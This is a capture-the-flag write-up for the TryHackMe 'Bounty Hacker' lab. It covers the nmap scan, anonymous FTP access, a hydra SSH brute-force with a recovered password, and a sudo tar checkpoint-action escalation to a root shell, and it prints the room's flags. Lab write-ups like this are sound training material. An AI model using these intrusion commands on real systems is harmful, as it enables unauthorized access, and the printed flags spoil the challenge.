# Bounty Hacker

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Red Team  

## Overview

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

## Enumeration

### Command Used
```bash
sudo nmap 10.49.166.51 -n -T4 -sC -sV -oN Nmap-Scan
```
### Output
```ansi
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 15:54 +0530
Nmap scan report for 10.49.166.51
Host is up (0.016s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.137.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 08:88:2a:72:fe:42:bc:bf:c5:82:f1:3e:40:64:26:1d (RSA)
|   256 a8:86:8f:8c:4d:7a:8d:25:ed:c6:2f:9e:66:15:79:1e (ECDSA)
|_  256 97:74:7a:81:25:7f:b3:1b:d0:05:a5:47:c7:93:0e:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
```
### Analysis

The scan revealed three open services:

- **FTP (Port 21)**  
  Anonymous login is allowed; however, directory listing is restricted. This may indicate limited access or hidden files.

- **SSH (Port 22)**  
  Standard SSH service, potentially useful if valid credentials are discovered.

- **HTTP (Port 80)**  
  A web server is running with no title, suggesting a custom or minimal web application. This should be the primary focus for further enumeration.

## FTP Enumeration

### Observation

Anonymous FTP login was allowed. Upon accessing the server, two files were discovered:

- `locks.txt`
- `task.txt`

---

### File Analysis

#### locks.txt

The file contained multiple password candidates, suggesting it could be used as a wordlist for brute-force attacks.

#### task.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The signature `lin` likely indicates a valid system username.

---

### Analysis

The combination of a potential username (`lin`) and a password wordlist (`locks.txt`) suggests a brute-force attack against an authentication service.

---

### Next Step

A brute-force attack was performed against the SSH service using the identified username and wordlist.

## Brute Force on SSH

### Command Used
```bash
hydra -l lin -P locks.txt ssh://10.49.166.51  
```
## Credential Discovery

### Brute Force Attack

Using the discovered username `lin` and the password list from `locks.txt`, a brute-force attack was performed against the SSH service:

```bash
hydra -l lin -P locks.txt ssh://10.49.166.51
```

### Result

Valid credentials were identified:

```
Username: lin
Password: RedDr4gonSynd1cat3
```

---

## Initial Access

### SSH Login

```bash
ssh lin@10.49.166.51
```

### Result

Successful login as user `lin`, providing initial access to the target system.

## User Flag

### Locating the Flag

After gaining initial access via SSH, the user’s home directory was explored:

```bash
ls
```

### Retrieving the Flag

```bash
cat user.txt
```

### Result

```
THM{CR1M3_SyNd1C4T3}
```

---

### Explanation

The user flag represents proof of successful initial access to the system. It confirms that the attacker has obtained a foothold as a low-privileged user.

## Privilege Escalation

### Checking Sudo Privileges

```bash
sudo -l
```

### Observation

The user `lin` is allowed to run `/bin/tar` as root:

```
(root) /bin/tar
```

---

### Analysis

The `tar` binary can be abused to execute arbitrary commands using checkpoint actions, which can lead to privilege escalation when executed with sudo.

---

### Exploitation

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

### Result

A root shell was successfully obtained:

```bash
whoami
root
```

---

## Root Flag

### Locating the Flag

After obtaining root access, the root directory was accessed:

```bash
cd /root
ls
```

### Retrieving the Flag

```bash
cat root.txt
```

### Result

```
THM{80UN7Y_h4cK3r}
```

---

### Explanation

The root flag confirms full system compromise and successful privilege escalation to the highest level of access.

## Attack Chain Summary

FTP → Extracted username and password wordlist  
→ SSH brute force → Initial access (lin)  
→ Retrieved user flag  
→ Sudo misconfiguration (tar) → Privilege escalation  
→ Root access → Retrieved root flag

# Thanks For Reading | Creator Zeref0xD
